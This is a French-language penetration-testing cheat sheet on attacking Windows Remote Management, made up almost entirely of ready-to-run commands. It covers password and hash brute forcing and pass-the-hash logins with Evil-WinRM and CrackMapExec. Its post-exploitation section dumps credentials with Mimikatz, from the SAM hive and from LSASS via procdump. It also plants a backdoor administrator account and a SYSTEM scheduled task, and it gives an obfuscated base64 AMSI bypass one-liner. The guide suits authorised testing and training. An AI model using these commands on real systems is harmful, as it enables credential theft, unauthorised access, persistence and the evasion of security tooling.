# 🖥️ WinRM Exploitation - Guide Complet

Guide exhaustif pour l'énumération et l'exploitation de Windows Remote Management.

---

## 📖 Concepts de Base

### Qu'est-ce que WinRM ?

**WinRM** (Windows Remote Management) est l'implémentation Microsoft du protocole WS-Management pour l'administration à distance.

```
Port 5985 : HTTP (WinRM)
Port 5986 : HTTPS (WinRM over SSL)
```

### Prérequis pour se connecter

```
✓ Credentials valides (password ou hash)
✓ L'utilisateur doit être membre de:
  - Administrators (local ou domaine)
  - Remote Management Users
✓ WinRM doit être activé sur la cible
```

---

## 1️⃣ Énumération

### Nmap

```bash
# Détection WinRM
nmap -p 5985,5986 -sV TARGET

# Scripts WinRM
nmap -p 5985 --script http-winrm-auth-methods TARGET
```

### CrackMapExec

```bash
# Vérifier si WinRM est accessible
crackmapexec winrm TARGET

# Avec credentials
crackmapexec winrm TARGET -u username -p password
crackmapexec winrm TARGET -u username -H NTLM_HASH

# Tester une liste d'utilisateurs
crackmapexec winrm TARGET -u users.txt -p passwords.txt

# Exécuter une commande
crackmapexec winrm TARGET -u user -p pass -x "whoami"
crackmapexec winrm TARGET -u user -p pass -X "Get-Process"  # PowerShell
```

### Test manuel avec curl

```bash
# Test basique
curl -v http://TARGET:5985/wsman

# Avec auth
curl -u 'DOMAIN\user:password' http://TARGET:5985/wsman
```

---

## 2️⃣ Evil-WinRM

### Installation

```bash
gem install evil-winrm
# ou
git clone https://github.com/Hackplayers/evil-winrm
```

### Connexion basique

```bash
# Avec mot de passe
evil-winrm -i TARGET -u username -p 'password'

# Avec hash NTLM (Pass-the-Hash)
evil-winrm -i TARGET -u username -H NTLM_HASH

# Avec domaine
evil-winrm -i TARGET -u 'DOMAIN\username' -p 'password'

# SSL (port 5986)
evil-winrm -i TARGET -u username -p 'password' -S -P 5986

# Avec clé Kerberos
evil-winrm -i TARGET -r DOMAIN.LOCAL
```

### Fonctionnalités Evil-WinRM

```powershell
# Menu d'aide
*Evil-WinRM* PS> menu

# Upload de fichier
*Evil-WinRM* PS> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Download de fichier
*Evil-WinRM* PS> download C:\Windows\Temp\file.txt /local/path/

# Charger un script PowerShell
evil-winrm -i TARGET -u user -p pass -s /path/to/scripts/
*Evil-WinRM* PS> Invoke-Mimikatz.ps1
*Evil-WinRM* PS> Invoke-Mimikatz

# Charger un binaire
evil-winrm -i TARGET -u user -p pass -e /path/to/binaries/
*Evil-WinRM* PS> Bypass-4MSI
*Evil-WinRM* PS> ./mimikatz.exe

# Bypass AMSI
*Evil-WinRM* PS> Bypass-4MSI

# Liste des services
*Evil-WinRM* PS> services

# Liste des processus
*Evil-WinRM* PS> Get-Process
```

---

## 3️⃣ PowerShell Remoting

### Depuis Windows

```powershell
# Activer WinRM localement
Enable-PSRemoting -Force

# Test de connexion
Test-WSMan -ComputerName TARGET

# Session interactive
Enter-PSSession -ComputerName TARGET -Credential (Get-Credential)

# Exécuter une commande
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {whoami}

# Exécuter un script
Invoke-Command -ComputerName TARGET -Credential $cred -FilePath C:\script.ps1

# Session persistante
$session = New-PSSession -ComputerName TARGET -Credential $cred
Enter-PSSession -Session $session
# Commandes...
Exit-PSSession
Remove-PSSession -Session $session

# Avec hash (nécessite module)
# Voir: Invoke-TheHash
```

### Depuis Linux (pywinrm)

```python
#!/usr/bin/env python3
import winrm

session = winrm.Session(
    'http://TARGET:5985/wsman',
    auth=('DOMAIN\\username', 'password'),
    transport='ntlm'
)

# Exécuter une commande
result = session.run_cmd('whoami')
print(result.std_out.decode())

# Exécuter PowerShell
result = session.run_ps('Get-Process')
print(result.std_out.decode())
```

---

## 4️⃣ Impacket

### psexec.py (via WinRM indirect)

```bash
# WMIexec utilise WMI mais peut être une alternative
wmiexec.py DOMAIN/user:password@TARGET
wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET
```

### Autres outils Impacket

```bash
# smbexec
smbexec.py DOMAIN/user:password@TARGET

# dcomexec
dcomexec.py DOMAIN/user:password@TARGET

# atexec (scheduled task)
atexec.py DOMAIN/user:password@TARGET 'whoami'
```

---

## 5️⃣ Post-Exploitation via WinRM

### Énumération

```powershell
# Informations système
systeminfo
hostname
whoami /all

# Utilisateurs
net user
net localgroup administrators

# Réseau
ipconfig /all
netstat -ano
route print

# Processus
Get-Process
tasklist

# Services
Get-Service
sc query

# Firewall
netsh advfirewall show allprofiles
```

### Persistence

```powershell
# Créer un utilisateur
net user backdoor P@ssw0rd! /add
net localgroup administrators backdoor /add
net localgroup "Remote Management Users" backdoor /add

# Scheduled Task
schtasks /create /tn "Backdoor" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM
```

### Extraction de credentials

```powershell
# Avec Mimikatz
./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Dump SAM
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
# Télécharger et extraire avec secretsdump.py

# Dump LSASS
# Via procdump
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### Mouvement latéral

```powershell
# Depuis la session WinRM, pivoter vers une autre machine
$cred = Get-Credential
Invoke-Command -ComputerName OTHER_TARGET -Credential $cred -ScriptBlock {whoami}

# Ou créer une nouvelle session Evil-WinRM vers la nouvelle cible
```

---

## 6️⃣ Bypass et Évasion

### Bypass AMSI

```powershell
# Dans Evil-WinRM
*Evil-WinRM* PS> Bypass-4MSI

# Manuellement
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

### Bypass Execution Policy

```powershell
# Déjà fait par Evil-WinRM généralement

# Manuellement
powershell -ExecutionPolicy Bypass -File script.ps1
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass
```

### Proxy et redirection

```bash
# Via proxy SOCKS
proxychains evil-winrm -i TARGET -u user -p pass

# Avec chisel
# Voir: pivoting.md
```

---

## 7️⃣ WinRM depuis Metasploit

### Scanner

```bash
use auxiliary/scanner/winrm/winrm_login
set RHOSTS TARGET
set USERNAME user
set PASSWORD password
run

# Brute force
use auxiliary/scanner/winrm/winrm_login
set RHOSTS TARGET
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### Shell

```bash
use exploit/windows/winrm/winrm_script_exec
set RHOSTS TARGET
set USERNAME user
set PASSWORD password
run
```

---

## 8️⃣ Troubleshooting

### Erreurs courantes

```bash
# "Access Denied"
# → L'utilisateur n'est pas dans Remote Management Users ou Administrators

# "WinRM cannot process the request"
# → WinRM non activé ou mal configuré

# "The WinRM client cannot process the request"
# → Problème de trust/certificat (essayer -S pour SSL)
```

### Activer WinRM sur la cible

```powershell
# Si vous avez déjà un accès
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*"
```

---

## 9️⃣ Cheatsheet Rapide

```bash
# === ÉNUMÉRATION ===
nmap -p 5985,5986 TARGET
crackmapexec winrm TARGET -u user -p pass

# === EVIL-WINRM ===
# Password
evil-winrm -i TARGET -u user -p 'password'

# Hash
evil-winrm -i TARGET -u user -H NTLM_HASH

# SSL
evil-winrm -i TARGET -u user -p pass -S

# Avec scripts
evil-winrm -i TARGET -u user -p pass -s /scripts/

# === DANS LA SESSION ===
upload local.exe C:\Temp\remote.exe
download C:\Temp\file.txt local.txt
Bypass-4MSI
menu

# === CRACKMAPEXEC ===
crackmapexec winrm TARGET -u user -p pass -x "whoami"
crackmapexec winrm TARGET -u user -H HASH

# === POWERSHELL ===
Enter-PSSession -ComputerName TARGET -Credential $cred
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {whoami}

# === POST-EXPLOITATION ===
whoami /all
net localgroup administrators
systeminfo
```

---

## 📚 Ressources

- **Evil-WinRM** : https://github.com/Hackplayers/evil-winrm
- **HackTricks WinRM** : https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Using%20credentials.md

---

**Tags:** `#winrm #powershell #evil-winrm #remote-management #lateral-movement #windows`
